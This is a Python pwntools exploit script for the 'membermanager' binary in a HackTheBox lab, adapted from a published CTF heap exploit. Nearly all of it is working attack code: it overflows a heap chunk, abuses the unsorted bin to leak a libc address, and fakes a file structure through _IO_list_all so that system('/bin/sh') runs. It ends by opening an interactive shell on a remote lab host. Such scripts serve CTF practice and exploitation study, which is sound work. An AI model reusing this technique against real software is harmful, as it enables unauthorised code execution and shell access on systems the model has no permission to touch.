# Exploit for ./membermanager binary in HackTheBox Jet Member Manager
# based on the following exploit: https://github.com/megumish/ctfs/blob/master/2017/0x00ctf2017/babyheap/exploit.py
# !/usr/bin/python

from pwn import *

LOCAL = False

if LOCAL:
    c = process('./babyheap')
    iolist_diff = 0x3aa500
    read_diff = 0xe93c0
    sys_diff = 0x43360
else:
    c = remote('10.13.37.10', 5555)
    iolist_diff = 0x3c5520
    read_diff = 0xf7250
    sys_diff = 0x45390


def add(size, username):
    c.sendline(b'1')
    c.recvuntil(b'size:')
    c.sendline(str(size).encode())
    c.recvuntil(b'username:')
    c.sendline(username)
    c.recvuntil(b'6. exit')


def edit(id, mode, username):
    c.sendline(b'2')
    c.recvuntil(b'2. insecure edit')
    c.sendline(str(mode).encode())
    c.recvuntil(b'index:')
    c.sendline(str(id).encode())
    c.recvuntil(b'new username:')
    c.sendline(username)
    c.recvuntil(b'6. exit')


def ban(id):
    c.sendline(b'3')
    c.recvuntil(b'index:')
    c.sendline(str(id).encode())
    c.recvuntil(b'6. exit')


def change(name):
    c.sendline(b'4')
    c.recvuntil(b'enter new name:')
    c.sendline(name)


# Prep exploit
name = b"A" * 8
c.recvuntil(b'enter your name:')
c.sendline(name)

# Run exploit
add(0x88, b"A" * 0x88)  # 0 ; chunk to overflow from
add(0x100, b"B" * 8)    # 1 ; (size >= 0x100) = 0x110

payload = b"D" * 0x160
payload += p64(0)       # fake prev
payload += p64(0x21)    # fake size + PREV_INUSE < important
add(0x500, payload)     # 2 ; 0x510 chunk
add(0x88, b"E" * 8)     # 3 ; prevent top consolidation

c.recv()
ban(2)  # put in unsortedbin

payload = b"A" * 0x88
payload += p16(0x281)
edit(0, 2, payload)

c.recv()
c.sendline(b'5')
c.recvline()
libc_read = int(c.recvline().strip())
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff

print('[*] libc_base @', hex(libc_base))

c.recv()
payload = p64(0) * 3
payload += p64(libc_system)
change(payload)

_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0

payload = b"B" * (8 * 32)
payload += b'/bin/sh\x00'
payload += p64(0x61)
payload += p64(0)
payload += p64(_IO_list_all - 0x10)
payload += p64(2)
payload += p64(3)
payload += p64(0) * 21
payload += p64(name_ptr)

edit(1, 1, payload)
sleep(2)

pause()
c.recv()
c.sendline(b'1')
c.recvuntil(b'size:')
c.sendline(str(0x80).encode())

c.interactive()